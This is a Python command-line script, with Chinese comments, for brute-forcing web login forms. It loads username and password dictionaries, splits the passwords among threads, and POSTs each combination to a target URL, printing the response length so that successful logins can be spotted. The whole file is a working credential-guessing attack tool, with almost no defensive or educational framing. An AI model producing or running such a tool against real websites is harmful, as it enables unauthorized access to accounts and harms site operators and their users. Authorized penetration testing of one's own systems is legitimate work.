import optparse
import math 
import pysnooper
import threading
import requests
# @pysnooper.snoop("./log.log")

parser = optparse.OptionParser()
parser.usage = "web_burte_command.py -u url -n user_file -p pass_file -t num"
parser.add_option("-u", "--site", dest = "website", help = "website to test", action = "store", type = "string", metavar = "URL")
parser.add_option("-n", "--namefile", dest = "namefile", help = "name from file", action = "store", type = "string", metavar = "NAMEFILE")
parser.add_option("-p", "--passfile", dest = "passfile", help = "pass from file", action = "store", type = "string", metavar = "PASSFILE")
parser.add_option("-t", "--threads", dest = "threads", help = "num of threads", action = "store", type = "string", metavar = "THREAD")
(options, args) = parser.parse_args()


ths = int(options.threads)
pass_dic = options.passfile
user_dic = options.namefile
site = options.website


def scan(payload):
    user = payload["username"]
    threads_pass_list = payload["pass_list"]
    for password in threads_pass_list:
        r = requests.post(url = site, data = {"username":user, "password":password.strip(), "submit":"submit"}) # 根据实际情况修改相应的参数
        print ("username: "+user+" ; "+"password : "+password+"  "+str(len(r.text))+ "\n")


# 新建一个密码字典列表 [[],[],[]]
pass_list = []
result_num = 0 # 每个线程要读取的行数
# 根据线程数确定每一项当中的行数，一个线程读取多少行密码
# 第一步：确定pass的行数
with open(pass_dic, "r") as f:
    temp_list = f.readlines()
    temp_thread_list = []
    num = len(temp_list)
    # 根据临时列表的项数除以线程数 得到每一线程中的项数
    result = num / ths
    # 第三步获取向上取整的行数math.ceil(num / ths)
    # if num % ths == 0:
    #     result = num / ths
    # else:
    result = math.ceil(num / ths)
    result_num = result
    flag = 0
    for line in temp_list:
        flag += 1
        temp_thread_list.append(line.strip()) # 去除换行
        if flag == result_num:
            flag = 0
            pass_list.append(temp_thread_list)
            temp_thread_list = []
    pass_list.append(temp_thread_list)

# payload - > pass_list 结合用户名字典来进行确定
# 使用线程列表
ths_list = []
with open(user_dic, "r") as f:
    user_list = f.readlines()
    for user in user_list:
        for pass_line in pass_list:
            payload = {"username":user.strip(), "pass_list":pass_line}
            ths_list.append(threading.Thread(target = scan, args = (payload, )))
for th in ths_list:
    th.start()

